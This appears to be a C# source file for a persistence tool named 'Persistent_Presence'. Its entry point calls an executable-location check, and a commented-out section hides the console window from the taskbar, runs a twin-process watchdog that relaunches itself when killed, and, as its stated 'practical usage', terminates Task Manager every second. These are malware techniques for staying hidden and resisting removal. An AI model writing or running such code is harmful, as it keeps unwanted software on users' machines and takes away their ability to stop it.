using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;

namespace Persistent_Presence
{
    class main
    {
        #region <Hiding console application from taskbar.>
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        // const int SW_SHOW = 5;
        #endregion

        static void Main(string[] args)
        {
            Persistent_Presence main_program = new Persistent_Presence();
            main_program.check_executable_location();
            /*
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE); // Hide

            Background_Process_Twin main_program = new Background_Process_Twin();
            while (true)
            {
                Thread.Sleep(1000); // Sleep reduces CPU Usage from 40% down to 2.1%.
                if (main_program.check_processes() == false)
                {
                    Debug.WriteLine("[*] Twin Process Dead [2]");
                    main_program.execute_twin_process();
                }
                #region Example of practical usage (Continuously closes task manager).
                try
                {
                    Process[] proc = Process.GetProcessesByName("Taskmgr");
                    if (proc.Length >= 1)
                    {
                        Debug.WriteLine(proc[0]);
                        Debug.WriteLine("[*] Task Manager Killed");
                        proc[0].Kill();
                    }
                }
                catch(Exception ex)
                {
                    Debug.WriteLine(ex);
                }
                #endregion
            }
        */
        }
    }
}
